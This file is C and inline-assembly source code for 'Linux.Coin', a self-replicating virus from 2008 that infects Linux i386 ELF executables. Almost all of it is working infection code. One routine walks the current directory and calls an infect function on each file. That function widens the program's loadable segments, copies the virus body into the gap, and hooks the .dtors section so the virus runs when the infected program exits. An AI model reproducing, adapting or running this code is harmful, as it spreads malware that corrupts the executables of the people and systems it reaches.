   /* Linux.Coin (x) herm1t@vx.netlux.org, feb 2008 */
   /* 2008-07-25 fixed */
   /* 2008-05-05 gain control via .dtors */
   #include <stdint.h>
   #include <elf.h>
   #include <sys/mman.h>
   #include <asm/unistd.h>

   asm(".globl _start");
   asm("fake_host: mov $1,%eax; int $0x80");
   asm("_start: push $fake_host; call caveat; ret");

   #define NULL        ((void*)0)
   #define ASM     asm volatile
   #define _SC(r,NR)   "push %1\npop %%eax\nint $0x80":"=a"(r):"i"(NR)
   #define syscall0(NR)            \
   ({int r;ASM(_SC(r,NR));r; })
   #define syscall1(NR,a)          \
   ({int r;ASM(_SC(r,NR),"b"((int)(a)));r;})
   #define syscall2(NR,a,b)        \
   ({int r;ASM(_SC(r,NR),"b"((int)(a)),"c"((int)(b)));r;})
   #define syscall3(NR,a,b,c)      \
   ({int r;ASM(_SC(r,NR),"b"((int)(a)),"c"((int)(b)),"d"((int)(c)));r;})

   #define syscall4(NR,a,b,c,d)        \
   ({int r;ASM(_SC(r,NR),"b"((int)(a)),"c"((int)(b)),"d"((int)(c)),"S"((int)(d)));r;})

   #define syscall6(NR,a,b,c,d,e,f)    \
   ({int r;ASM("push %%ebp\nmovl %%eax,%%ebp\nmov %1,%%eax\nint $0x80\npop %%ebp"  \
           :"=a"(r):"i"(NR),"b"((int)(a)), \
       "c"((int)(b)),"d"((int)(c)),"S"((int)(d)),"D"((int)(e)),"0"((int)(f)));r;})
   #define exit(a)         syscall1(1,  a)
   #define read(a,b,c)     syscall3(3,  a,b,c)
   #define write(a,b,c)        syscall3(4,  a,b,c)
   #define open(a,b)       syscall2(5,  a,b)
   #define close(a)        syscall1(6,  a)
   #define creat(a,b)      syscall2(8,  a,b)
   #define time(a)         syscall1(13, a)
   #define lseek(a,b,c)        syscall3(19, a,b,c)
   #define rename(a,b)     syscall2(38, a,b)
   #define readdir(a,b)        syscall2(89, a,b)
   #define munmap(a,b)     syscall2(91, a,b)
   #define ftruncate(a,b)      syscall2(93, a,b)
   #define mprotect(a,b,c)     syscall3(125,a,b,c)
   #define mremap(a,b,c,d)     syscall4(163,a,b,c,d)
   #define mmap(a,b,c,d,e,f)   syscall6(192,a,b,c,d,e,f)

   static void inline memcpy(void *dst, void *src, int len)
   {
       int i;
       for (i = 0; i < len; i++)
           *(char*)dst++ = *(char*)src++;
   }

   static void inline memmove(void *dst_void, void *src_void, int len)
   {
       char *dst = dst_void;
       char *src = src_void;
       if (src < dst && dst < src + len) {
           src += len;
           dst += len;
           while (len--)
               *--dst = *--src;
       } else {
           while (len--)
               *dst++ = *src++;
       }
   }

   static int inline strcmp(char *s1, char *s2)
   {
       while (*s1 != 0 && *s1 == *s2)
           s1++, s2++;
       if (*s1 == 0 || *s2 == 0)
           return (unsigned char) *s1 - (unsigned char) *s2;
       return *s1 - *s2;
   }

   static void infect(char *filename, char *self)
   {
       int h, l, i, ok, size;
       uint8_t *m;
       Elf32_Ehdr *ehdr;
       Elf32_Phdr *phdr;
   extern int _start;
   extern int virus_end;
       size = (char*)&virus_end - (char*)&_start;

       if ((h = open(filename, 2)) < 0)
           return;
       if ((l = lseek(h, 0, 2)) < 0)
           goto error1;
       m = (char*)mmap(NULL, l, PROT_READ|PROT_WRITE, MAP_SHARED, h, 0);
       if ((uint32_t)m > 0xfffff000)
           goto error1;

       ehdr = (Elf32_Ehdr*)m;
       if (*(uint32_t*)ehdr->e_ident != 0x464c457f ||
       ehdr->e_type != ET_EXEC ||
       ehdr->e_machine != EM_386 ||
       ehdr->e_version != EV_CURRENT ||
       ehdr->e_ident[EI_OSABI] != ELFOSABI_NONE) {
   error2:     munmap(m, l);
   error1:     close(h);
           return;
       }
       /* find loadable segments and check 'em */
       phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);
           for (ok = 0, i = 0; i < ehdr->e_phnum; i++)
                   if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0 &&
              (i + 1) < ehdr->e_phnum && phdr[i + 1].p_type == PT_LOAD) {
                           if (phdr[i].p_filesz != phdr[i].p_memsz)
                                   break;
                           ok++;
                           break;
                   }
       if (! ok)
           goto error2;
       uint32_t dp, tp, ve, vo;
           vo = phdr[i].p_filesz;
           ve = phdr[i].p_vaddr + phdr[i].p_filesz;
           tp = 4096 - (phdr[i].p_filesz & 4095);
           dp = phdr[i + 1].p_vaddr - (phdr[i + 1].p_vaddr & ~4095);
       if (tp + dp < size || tp == 0x1000 || phdr[i+1].p_filesz == 0)
           goto error2;

       /* update program headers */
       phdr[i].p_memsz += tp;
           phdr[i].p_filesz += tp;
       if (dp != 0) {
               phdr[i+1].p_vaddr -= dp;
               phdr[i+1].p_paddr -= dp;
               phdr[i+1].p_offset += tp;
               phdr[i+1].p_filesz += dp;
               phdr[i+1].p_memsz += dp;
           /* PHT */
           for (i = i + 2; i < ehdr->e_phnum; i++)
               if (phdr[i].p_offset >= vo)
                   phdr[i].p_offset += tp + dp;
           /* make hole */
               ftruncate(h, l + tp + dp);
               m = (char*)mremap(m, l, l + tp + dp, 1 /*MREMAP_MAYMOVE*/);
           if ((uint32_t)m > 0xfffff000)
               goto error1;
               memmove(m + vo + tp + dp, m + vo, l - vo);
           ehdr = (Elf32_Ehdr*)m;
       }

       /* update section headers and patch .dtors/.jcr */
           if (dp != 0 && ehdr->e_shoff >= vo)
                   ehdr->e_shoff += (tp + dp);
       Elf32_Shdr *shdr = (Elf32_Shdr*)(m + ehdr->e_shoff);
       char *strtab = m + shdr[ehdr->e_shstrndx].sh_offset;
       char dtors[] = { '.', 'd', 't', 'o', 'r', 's' };
           for (i = 1; i < ehdr->e_shnum; i++, shdr++) {
                   if (dp !=0 && shdr->sh_offset >= vo)
                           shdr->sh_offset += (tp + dp);
           if (! strcmp(strtab + shdr->sh_name, dtors)) {
               uint32_t *t;
               t = (uint32_t*)(m + shdr->sh_offset + shdr->sh_size - 4);
               if (t[0] == 0 && t[1] == 0) {
                   memcpy(m + vo, self, size);
                   *t = ve;
               }
           }
       }
       goto error2;
   }

   static void __attribute__((used)) caveat(void)
   {
       char dot[] = { '.', '\0' };
       char d[256];
       int h;
       char *self = __builtin_return_address(0) - 5;
       if ((h = open(dot, 0)) > 0)
           while (readdir(h, d) > 0)
               infect(d + 10, self);
       close(h);

   }

   asm("virus_end:");
